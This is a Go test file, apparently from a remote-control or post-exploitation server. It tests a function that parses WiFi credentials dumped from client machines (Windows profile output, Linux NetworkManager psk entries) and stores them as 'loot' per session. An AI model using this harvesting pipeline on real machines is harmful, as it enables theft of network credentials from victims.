package api

import (
	"path/filepath"
	"testing"

	"BackendTemplate/pkg/database"
)

func setupLootTest(t *testing.T) {
	t.Helper()
	tmpDir := t.TempDir()
	old := database.DatabaseName
	database.DatabaseName = filepath.Join(tmpDir, "test.db")
	database.ConnectDateBase()
	database.DatabaseName = old
	t.Cleanup(func() { database.Engine.Close() })
}

func lootRows(t *testing.T) []database.Loot {
	t.Helper()
	var rows []database.Loot
	if err := database.Engine.OrderBy("host").Find(&rows); err != nil {
		t.Fatal(err)
	}
	return rows
}

// TestIngestWindowsWifi 解析客户端 wifi 命令的 Windows 输出（=== WiFi Profiles === + --- SSID ---）
func TestIngestWindowsWifi(t *testing.T) {
	setupLootTest(t)

	output := `=== WiFi Profiles ===

--- HomeWiFi ---
配置文件名: HomeWiFi
    关键内容           : mypass123

--- OfficeWiFi ---
    Key Content        : office456

--- OpenNet ---
    Authentication     : Open
`
	if n := IngestLootFromOutput("uid-1", output); n != 2 {
		t.Fatalf("应识别 2 条 WiFi 凭据，实际 %d", n)
	}
	rows := lootRows(t)
	if len(rows) != 2 {
		t.Fatalf("应入库 2 条，实际 %d", len(rows))
	}
	if rows[0].Host != "HomeWiFi" || rows[0].Secret != "mypass123" || rows[0].Type != "pwd" || rows[0].Source != "wifi" {
		t.Fatalf("HomeWiFi 记录不符: %+v", rows[0])
	}
	if rows[1].Host != "OfficeWiFi" || rows[1].Secret != "office456" {
		t.Fatalf("OfficeWiFi 记录不符: %+v", rows[1])
	}
	if rows[0].Uid != "uid-1" {
		t.Fatalf("未关联会话 uid: %+v", rows[0])
	}
}

// TestIngestSkipsNonWifiOutput 普通命令输出里的 "key: value" 不能被误判成凭据
func TestIngestSkipsNonWifiOutput(t *testing.T) {
	setupLootTest(t)

	outputs := []string{
		"Key Content : something\n密码: hello\n",
		"=== Some Other Command ===\n--- x ---\n关键内容: y\n",
		"[wifi]\nssid=NoPskHere\n",
	}
	for _, out := range outputs {
		if n := IngestLootFromOutput("uid-1", out); n != 0 {
			t.Fatalf("不应识别出凭据（输出=%q），实际 %d 条", out, n)
		}
	}
	if rows := lootRows(t); len(rows) != 0 {
		t.Fatalf("不应入库，实际 %+v", rows)
	}
}

// TestIngestLinuxNetworkManager 解析 NetworkManager 配置（ssid 在前、psk 在后）
func TestIngestLinuxNetworkManager(t *testing.T) {
	setupLootTest(t)

	output := `[connection]
id=HomeWiFi
ssid=HomeWiFi
type=wifi

[wifi-security]
key-mgmt=wpa-psk
psk=mypass123
`
	if n := IngestLootFromOutput("uid-2", output); n != 1 {
		t.Fatalf("应识别 1 条，实际 %d", n)
	}
	rows := lootRows(t)
	if len(rows) != 1 || rows[0].Host != "HomeWiFi" || rows[0].Secret != "mypass123" {
		t.Fatalf("解析结果不符: %+v", rows)
	}
}

// TestIngestDeduplicates 同一条提取命令重复执行不应重复入库
func TestIngestDeduplicates(t *testing.T) {
	setupLootTest(t)

	output := `=== WiFi Profiles ===

--- HomeWiFi ---
    关键内容 : mypass123
`
	IngestLootFromOutput("uid-1", output)
	IngestLootFromOutput("uid-1", output)
	IngestLootFromOutput("uid-1", output)

	rows := lootRows(t)
	if len(rows) != 1 {
		t.Fatalf("重复执行应只保留 1 条，实际 %d", len(rows))
	}
}

// TestAddLootIfNotEmptyRequiresContent 空 secret 且空 note 不写库
func TestAddLootIfNotEmptyRequiresContent(t *testing.T) {
	setupLootTest(t)
	AddLootIfNotEmpty("uid-1", "pwd", "", "", "host", "  ", "", "wifi")
	if rows := lootRows(t); len(rows) != 0 {
		t.Fatalf("空内容不应入库: %+v", rows)
	}
}
